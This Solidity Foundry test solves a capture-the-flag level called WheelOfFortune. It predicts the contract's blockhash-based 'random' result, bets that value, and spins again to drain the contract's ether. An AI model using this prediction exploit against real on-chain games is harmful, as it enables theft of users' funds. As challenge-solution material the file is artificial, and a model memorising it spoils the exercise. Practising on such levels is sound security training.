// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/03_WheelOfFortune/WheelOfFortune.sol";

// forge test --match-contract WheelOfFortuneTest -vvvv
contract WheelOfFortuneTest is BaseTest {
    uint256 constant private BLOCK_NUMBER = 48743985;

    WheelOfFortune instance;

    function setUp() public override {
        super.setUp();
        instance = new WheelOfFortune{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function rand(bytes32 _hash, uint256 _max) internal pure returns (uint256) {
        return uint256(keccak256(abi.encode(_hash))) % _max;
    }

    function testExploitLevel() public {
        // There are check if (rand(blockhash(games[lastGameId].blockNumber), 100) == games[lastGameId].bet)
        // This means we need to pass there bet which is rand and call again with any number

        instance.spin{value: 0.01 ether}(rand(blockhash(BLOCK_NUMBER), 100));
        instance.spin{value: 0.01 ether}(100);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
